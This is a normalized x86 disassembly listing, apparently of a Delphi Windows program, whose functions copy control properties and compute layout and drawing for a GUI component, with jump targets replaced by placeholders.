jmp r-xdata
sub_47366c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f0 ]
call sub_47355c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f8 ]
call sub_47355c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2fc ]
call sub_47355c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f4 ]
call sub_47355c
pop ecx
pop ecx
pop ebp
retn
sub_4736b8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_46e6a0
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0x350 ]
mov [ ebx + 0x350 ] al
mov edx [ edi + 0x354 ]
mov eax [ ebx + 0x354 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x358 ]
mov eax [ ebx + 0x358 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x360 ]
mov eax [ ebx + 0x360 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x364 ]
mov eax [ ebx + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x35c ]
mov eax [ ebx + 0x35c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x3b8 ]
mov eax [ ebx + 0x3b8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_47375c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx [ edx + 0x30 ]
mov eax ebx
call sub_46a750
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_46a750
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebx
call sub_46a750
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov edx esi
call sub_469f9c
mov edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4737c8
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_46e68c
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x2e8 ]
mov edx ebx
call sub_46cf1c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_46da00
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_473808
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4621a8
mov [ esi + 0x5c ] 0x1
mov [ esi + 0xc ] 0x1
mov [ esi + 0x64 ] 0x0
mov [ esi + 0x30 ] 0xa
mov [ esi + 0x14 ] 0xffffff
mov eax esi
call sub_473b7c
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c45c
mov [ esi + 0x24 ] eax
mov [ esi + 0x50 ] 0x1
mov [ esi + 0x2d ] 0x0
mov [ esi + 0x18 ] 0xc
mov [ esi + 0x54 ] 0xa
mov [ esi + 0x44 ] 0x1
xor eax eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] 0x3
mov eax esi
call sub_473b7c
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c508
mov [ esi + 0x1c ] eax
mov eax esi
call sub_473b7c
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4713a0
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4738e0
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x1c ]
call sub_403198
mov eax [ esi + 0x24 ]
call sub_403198
mov eax [ esi + 0x10 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_462214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_473920
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_462244
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0x5c ]
mov [ ebx + 0x5c ] al
mov al [ edi + 0x2d ]
mov [ ebx + 0x2d ] al
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov al [ edi + 0xc ]
mov [ ebx + 0xc ] al
mov al [ edi + 0x50 ]
mov [ ebx + 0x50 ] al
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
mov eax [ edi + 0x28 ]
mov [ ebx + 0x28 ] eax
mov eax [ edi + 0x58 ]
mov [ ebx + 0x58 ] eax
mov al [ edi + 0x44 ]
mov [ ebx + 0x44 ] al
mov al [ edi + 0x2c ]
mov [ ebx + 0x2c ] al
mov eax [ edi + 0x54 ]
mov [ ebx + 0x54 ] eax
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov edx [ edi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x30 ]
mov [ ebx + 0x30 ] eax
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_473a10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push j_sub_4038ec#5
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
cmp ebx 0x64
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473a83
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax esi
call sub_473b7c
lea edx [ esi + 0x54 ]
mov ecx ebx
call sub_461564
sub_473a88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4038ec#4
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jge r-xdata
mov eax ebx
call sub_473b7c
lea edx [ ebx + 0x20 ]
mov ecx esi
call sub_4614d8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473af6
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_473bc4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_473c30
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
cmp ebx 0x64
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473c37
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax esi
call sub_473b7c
lea edx [ esi + 0x18 ]
mov ecx ebx
call sub_461564
sub_473c3c
push ebx
mov ebx eax
mov al [ ebx + 0x2d ]
test al al
jne r-xdata
mov [ ebx + 0x64 ] al
mov eax ebx
call sub_473b7c
mov eax [ eax + 0x2e8 ]
call sub_46cf30
dec eax
jle r-xdata
mov [ ebx + 0x64 ] 0x2
pop ebx
retn
mov [ ebx + 0x64 ] 0x1
jmp r-xdata
pop ebx
retn
sub_473c6c
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_473b7c
mov esi eax
mov al [ ebx + 0x64 ]
dec al
je r-xdata
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_46d844
jmp r-xdata
dec al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
push eax
mov eax esi
call sub_4737c8
mov edx eax
mov ecx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
push eax
mov edx edi
mov eax esi
call sub_46da00
call sub_46b9bc
dec eax
push eax
mov edx edi
mov eax esi
call sub_46da00
mov edx eax
mov eax esi
pop ecx
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
sub_473d30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_473b7c
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x8 ]
jle r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_41d434
add eax eax
push eax
mov eax esi
pop edx
sub eax edx
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x8 ]
add eax edi
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0xc ]
cdq
idiv ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_473e00
mov edx eax
mov eax ebx
call sub_46038c
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_473da4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_473b7c
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_473f64
test al al
je r-xdata
push ebp
xor ecx ecx
mov edx [ ebx + 0x240 ]
mov eax [ ebx + 0x296 ]
call sub_473d30
pop ecx
push ebp
mov ecx [ ebx + 0x292 ]
mov edx [ ebx + 0x244 ]
mov eax [ ebx + 0x29a ]
call sub_473d30
pop ecx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_473e00
push ebx
push esi
push edi
push ebp
mov ebx eax
xor edi edi
mov al [ ebx + 0x64 ]
cmp al 0x1
je r-xdata
mov eax ebx
call sub_473b7c
call sub_46e68c
mov esi eax
dec esi
test esi esi
jl r-xdata
cmp al 0x3
jne r-xdata
sub edi [ ebx + 0x20 ]
jmp r-xdata
inc esi
xor ebp ebp
mov eax ebx
call sub_473b7c
call sub_4737c8
mov esi eax
test esi esi
je r-xdata
mov edx edi
xor eax eax
call sub_460384
mov edi eax
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec esi
jne r-xdata
cmp [ eax + 0x70 ] 0x0
je r-xdata
cmp [ esi + 0x70 ] 0x0
je r-xdata
mov eax ebx
call sub_473b7c
mov edx ebp
call sub_46da00
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc edi
mov eax esi
mov edx [ eax ]
call [ edx + 0x9c ]
mov edi eax
sub edi [ ebx + 0x20 ]
sub_473e88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_473f24
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov edi [ ebx + 0x20 ]
add edi [ ebp - 0x4 ]
dec edi
mov eax ebx
call sub_473e00
mov edi eax
add edi [ ebx + 0x20 ]
dec edi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473f2b
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
inc ebx
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_473b7c
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x20 ]
mov ebx edi
sub ebx eax
jl r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_472000
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx eax
mov eax esi
call sub_460384
mov esi eax
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_473f34
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx [ ebp + 0x8 ]
mov ecx edx
sub ecx [ eax + 0x60 ]
mov [ ebx ] ecx
add ecx [ eax + 0x60 ]
mov [ ebx + 0x8 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x2
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x2
mov [ ebx + 0xc ] eax
pop ebx
pop ecx
pop ebp
retn 0x8
sub_473f78
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4741f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4741fe
lea eax [ ebp - 0x14 ]
call sub_403ee8
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_473b7c
mov ebx eax
mov esi [ ebx + 0x288 ]
xor edx edx
mov eax [ esi + 0x10 ]
call sub_41d734
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + 0x14 ]
mov eax [ esi + 0x10 ]
call sub_41d618
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x38 ]
inc eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_473f64
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
pop edx
mov ecx edx
cdq
idiv ecx
mov edx [ ebp + 0x8 ]
imul [ edx - 0x14 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
pop edx
mov ecx edx
cdq
idiv ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0xc ]
add eax [ ecx + 0x60 ]
add eax 0x4
imul edx eax
add [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
imul [ ebp - 0x8 ]
add [ ebp - 0x10 ] eax
jmp r-xdata
mov dl 0x1
mov eax [ esi + 0x10 ]
call sub_41d734
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_472000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_473b7c
mov edx eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x3ec ]
call [ ebx + 0x3e8 ]
cmp [ ebx + 0x3ea ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x5c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
add eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov edx [ ebp - 0xc ]
sub edx 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ ebp - 0x10 ]
call sub_473f34
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x64 ]
cmp al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x1c ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d7f4
lea ecx [ ebp - 0x24 ]
or edx 0xffffffff
mov edi [ eax ]
call [ edi + 0x128 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + 0x1c ]
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_473f64
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp - 0x24 ]
sub edx 0x4
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x74 ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + 0x34 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x6c ]
jmp r-xdata
mov edx 0xffffff
mov eax [ esi + 0x10 ]
call sub_41d618
xor edx edx
mov eax [ esi + 0x10 ]
call sub_41d734
lea edx [ ebp - 0x24 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
mov edx eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edi [ eax ]
call [ edi + 0x128 ]
jmp r-xdata
sub_474208
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffff4
mov eax [ edi ]
push edi
lea esi [ eax + 0x34 ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi ]
call sub_473b7c
mov esi [ eax + 0x288 ]
mov eax [ edi ]
mov edx [ eax + 0x24 ]
mov eax esi
call sub_45c8bc
mov eax [ edi ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4c ]
dec eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0xc ]
call sub_41d308
cmp eax 0x20000000
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x10 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esi + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x48 ]
mov eax [ esi + 0x10 ]
call sub_41d618
mov eax [ edi ]
lea ebx [ eax + 0x34 ]
mov eax [ ebx + 0xc ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov edx [ ebx + 0x4 ]
mov eax [ edi ]
add edx [ eax + 0x4c ]
mov eax [ ebx ]
mov ecx [ edi ]
add eax [ ecx + 0x4c ]
mov ecx [ ebx + 0x8 ]
add ecx [ ebp - 0x4 ]
call sub_412be0
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x20 ]
dec edx
sar edx 0x1
jns r-xdata
xor edx edx
mov eax [ esi + 0xc ]
call sub_41d310
mov eax [ edi ]
mov edx [ eax + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x2
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ edi ]
mov edx [ eax + 0x14 ]
mov eax [ esi + 0x10 ]
call sub_41d618
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
lea edx [ ebp - 0x24 ]
mov ecx 0x8
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
add eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
adc edx 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x10 ]
call sub_41d5e4
mov edx eax
mov eax [ esi + 0x10 ]
call sub_41d5ec
mov eax [ edi ]
mov eax [ eax + 0x10 ]
call sub_4713f4
test al al
je r-xdata
xor edx edx
mov eax [ esi + 0x10 ]
call sub_41d734
mov eax [ edi ]
cmp [ eax + 0x4c ] 0x0
jle r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x70 ]
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4743ac
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffff4
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x18 ]
mov eax [ esi ]
add ecx [ eax + 0x60 ]
add ecx 0x8
mov eax [ esi ]
mov edx 0x8
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
mov eax [ esi ]
mov [ eax + 0x68 ] ebx
test ebx ebx
jle r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cdq
idiv ebx
mov edx [ esi ]
mov [ edx + 0x6c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov ecx [ edx + 0x68 ]
cdq
idiv ecx
test edx edx
jle r-xdata
mov eax [ esi ]
mov edx [ eax + 0x30 ]
mov eax [ esi ]
mov eax [ eax + 0x6c ]
call sub_46038c
mov edx [ esi ]
mov [ edx + 0x6c ] eax
jmp r-xdata
mov eax [ esi ]
inc [ eax + 0x6c ]
pop esi
pop ebx
pop ebp
retn
sub_474424
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x28 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
pop ebp
retn
push 0x64
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_473b7c
mov eax [ eax + 0x240 ]
push eax
push 0x3
call MulDiv
pop ebp
retn
sub_474458
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x58 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
pop ebp
retn
push 0x64
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_473b7c
mov eax [ eax + 0x244 ]
push eax
push 0x4
call MulDiv
pop ebp
retn
sub_47448c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_473c3c
mov eax [ ebp - 0xc ]
call sub_473b7c
mov ebx eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov [ ebx + 0x34c ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebx + 0x288 ]
call sub_45c9c4
mov [ ebp - 0x14 ] eax
or edx 0xffffffff
mov eax [ ebp - 0xc ]
call sub_473e88
add eax 0x4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
imul [ ebp - 0x18 ]
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fld [ r-xdata ]
fmulp st1
call sub_402990
mov edx [ ebp - 0xc ]
mov [ edx + 0x60 ] eax
mov eax [ ebp - 0xc ]
call sub_473e00
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
call sub_41d434
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
lea esi [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov al [ eax + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x292 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
dec al
jne r-xdata
push ebp
call sub_4743ac
pop ecx
mov eax [ esi + 0x4 ]
add eax 0x2
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x6c ]
imul edx [ ebp - 0x14 ]
add eax edx
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
add [ esi + 0x4 ] eax
mov eax [ ebp - 0xc ]
fild [ eax + 0x54 ]
fmul [ r-xdata ]
mov eax [ ebx + 0x239 ]
mov edi [ ebx + 0x231 ]
sub eax edi
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fmulp st1
fld [ r-xdata ]
fmulp st1
call sub_402990
add eax edi
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x68 ] 0x1
mov edx [ esi + 0x4 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x6c ] eax
mov eax [ esi + 0x4 ]
add eax 0x2
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x6c ]
imul edx [ ebp - 0x14 ]
add eax edx
mov [ esi + 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebx + 0x29a ]
sub edx [ eax + 0x4c ]
mov [ esi + 0xc ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp - 0xc ]
lea edi [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov al [ eax + 0xc ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0xc ]
call sub_473e88
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x28e ]
mov [ edi ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
je r-xdata
push ebp
call sub_4743ac
pop ecx
mov eax [ esi + 0xc ]
sub eax 0x2
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x6c ]
imul edx [ ebp - 0x14 ]
sub eax edx
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
sub [ esi + 0xc ] eax
mov eax [ edi ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x4
add eax [ ebp - 0x18 ]
add eax 0x2
sub eax [ edi ]
mov edx [ ebp - 0xc ]
imul [ edx + 0x18 ]
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fld [ r-xdata ]
fmulp st1
call sub_402990
mov esi eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x60 ] esi
add esi [ ebp - 0x4 ]
add esi 0x4
mov [ ebp - 0x10 ] esi
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
add eax 0x2
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x6c ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
add [ edi ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x6c ]
